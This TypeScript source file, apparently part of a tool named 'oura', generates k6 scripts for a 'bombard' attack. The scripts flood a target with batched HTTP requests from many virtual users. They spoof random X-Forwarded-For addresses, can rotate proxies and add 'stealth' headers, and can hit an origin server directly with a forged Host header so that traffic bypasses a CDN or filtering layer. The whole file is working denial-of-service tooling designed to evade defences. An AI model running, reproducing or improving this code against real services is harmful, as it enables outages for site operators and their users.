import type { AttackOptions } from "../runner.js";
import { sanitizeForScript } from "../../utils/sanitizer.js";
import { generateStealthHelpersScript } from "./utils/stealth.js";

function buildThresholds(opts: AttackOptions): string {
	if (!opts.thresholds || opts.thresholds.length === 0) return "";
	const grouped: Record<string, string[]> = {};
	for (const t of opts.thresholds) {
		const colonIndex = t.indexOf(":");
		if (colonIndex === -1) continue;
		const metric = t.slice(0, colonIndex);
		const condition = t.slice(colonIndex + 1);
		if (!grouped[metric]) grouped[metric] = [];
		grouped[metric].push(condition);
	}
	const lines = Object.entries(grouped).map(([metric, conditions]) => {
		const conditionsStr = conditions.map((c) => JSON.stringify(c)).join(", ");
		return `    "${metric}": [${conditionsStr}]`;
	});
	return `,\n    thresholds: {\n${lines.join(",\n")}\n    }`;
}

function extractHost(target: string): string {
	const match = target.match(/^https?:\/\/([^/]+)/);
	return match ? match[1] : target;
}

function buildOriginTarget(target: string, origin: string): string {
	return target.replace(/^https?:\/\/[^/]+/, `http://${origin}`);
}

export function bombardTemplate(opts: AttackOptions): string {
	const headersStr = Object.entries(opts.headers)
		.map(([k, v]) => `${sanitizeForScript(k)}: ${sanitizeForScript(v)}`)
		.join(", ");

	const batchSize = Math.min(Math.max(opts.rpsPerVu, 1), 20);

	const hasProxyList = opts.proxyList.length > 0;
	const hasOrigin = opts.origin.length > 0;
	const hostname = extractHost(opts.target);
	const actualTarget = hasOrigin
		? sanitizeForScript(buildOriginTarget(opts.target, opts.origin))
		: sanitizeForScript(opts.target);

	const checkBlock = opts.noCheck
		? ""
		: `  for (const res of responses) {
    check(res, {
      "status was 200": (r) => r.status === 200,
    });
  }`;

	const stealthCheckBlock = opts.noCheck
		? ""
		: `  for (const res of responses) {
      check(res, {
        "status was 200": (r) => r.status === 200,
      });
    }`;

	const xffScript = `
function randomIP() {
  const ranges = [
    [1, 126], [128, 191], [192, 223],
  ];
  const range = ranges[Math.floor(Math.random() * ranges.length)];
  const a = Math.floor(Math.random() * (range[1] - range[0] + 1)) + range[0];
  const b = Math.floor(Math.random() * 256);
  const c = Math.floor(Math.random() * 256);
  const d = Math.floor(Math.random() * 254) + 1;
  return a + "." + b + "." + c + "." + d;
}
`;

	const proxyRotationScript = hasProxyList
		? `
const PROXY_LIST = JSON.parse(__ENV.PROXY_LIST || "[]");

function randomProxy() {
  if (PROXY_LIST.length === 0) return undefined;
  return PROXY_LIST[Math.floor(Math.random() * PROXY_LIST.length)];
}
`
		: "";

	const hostHeader = hasOrigin
		? `"Host": ${sanitizeForScript(hostname)}, `
		: "";

	const defaultHeaders = `${hostHeader}${headersStr || `${sanitizeForScript("User-Agent")}: ${sanitizeForScript("oura/1.0")}`}`;

	const proxyParam = hasProxyList
		? `    const proxyUrl = randomProxy();\n`
		: "";
	const proxyObj = hasProxyList
		? `, ...(proxyUrl ? { proxy: proxyUrl } : {})`
		: "";

	const buildRequestParams = (headerExpr: string) =>
		`{ headers: ${headerExpr}, timeout: "10s"${proxyObj} }`;

	const stealthBlock = opts.stealth
		? `${generateStealthHelpersScript()}
${xffScript}${proxyRotationScript}
const BASE_HEADERS = { ${defaultHeaders} };

export default function () {
  const stealthHeaders = generateStealthHeaders();
  const mergedHeaders = Object.assign({}, BASE_HEADERS, stealthHeaders, { "X-Forwarded-For": randomIP() });
${proxyParam}
  const params = ${buildRequestParams("mergedHeaders")};

  const requests = [];
  for (let i = 0; i < BATCH_SIZE; i++) {
    if (PAYLOAD) {
      requests.push(["METHOD", TARGET, PAYLOAD, params]);
    } else {
      requests.push(["METHOD", TARGET, params]);
    }
  }

  let responses;
  if (!handleBackoff(null)) {
    responses = http.batch(requests);
    ${stealthCheckBlock}
    stealthSleep();
  }
}`
		: `${xffScript}${proxyRotationScript}
const HEADERS = { ${defaultHeaders} };

export default function () {
  const reqHeaders = Object.assign({}, HEADERS, { "X-Forwarded-For": randomIP() });
${proxyParam}
  const params = ${buildRequestParams("reqHeaders")};

  const requests = [];
  for (let i = 0; i < BATCH_SIZE; i++) {
    if (PAYLOAD) {
      requests.push(["METHOD", TARGET, PAYLOAD, params]);
    } else {
      requests.push(["METHOD", TARGET, params]);
    }
  }

  const responses = http.batch(requests);
${checkBlock}
}`;

	const optionsBlock = `  scenarios: {
    bombard: {
      executor: "constant-vus",
      vus: ${opts.vus},
      duration: ${sanitizeForScript(opts.duration)},
      gracefulStop: "5s",
    },
  },`;

	const thresholdBlock = buildThresholds(opts);

	return `import http from "k6/http";
import { check } from "k6";

export const options = {
${optionsBlock}${thresholdBlock}
};

const TARGET = ${actualTarget};
const METHOD = ${sanitizeForScript(opts.method.toLowerCase())};
const PAYLOAD = ${opts.payload ? sanitizeForScript(opts.payload) : "null"};
const BATCH_SIZE = ${batchSize};

${stealthBlock}
`;
}
